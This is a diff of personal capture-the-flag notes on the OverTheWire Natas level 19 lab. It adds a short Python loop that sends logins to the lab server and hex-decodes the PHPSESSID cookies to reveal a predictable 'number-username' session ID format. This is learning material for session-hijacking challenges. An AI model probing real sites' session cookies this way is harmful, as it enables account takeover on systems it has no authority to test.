@@ -59,3 +59,21 @@ last challenge PHPSESSID is 119, now we need the password...
 
 python encoding:
 'string'.encode().hex()
+
+looks like we might not need the password afterall
+
+>>> for test in tests:
+...     url = 'http://natas19.natas.labs.overthewire.org/index.php?username={}&password='.format(test)
+...     r = requests.post(url, headers=headers)
+...     print(test+'\t--> '+bytes.fromhex(r.cookies['PHPSESSID']).decode('ascii'))
+... 
+a       --> 372-a
+aa      --> 148-aa
+aaa     --> 46-aaa
+b       --> 215-b
+bb      --> 131-bb
+bbb     --> 135-bbb
+ab      --> 35-ab
+ba      --> 361-ba
+
+it adds username as the password if one isn't supplied...let's see if this works.
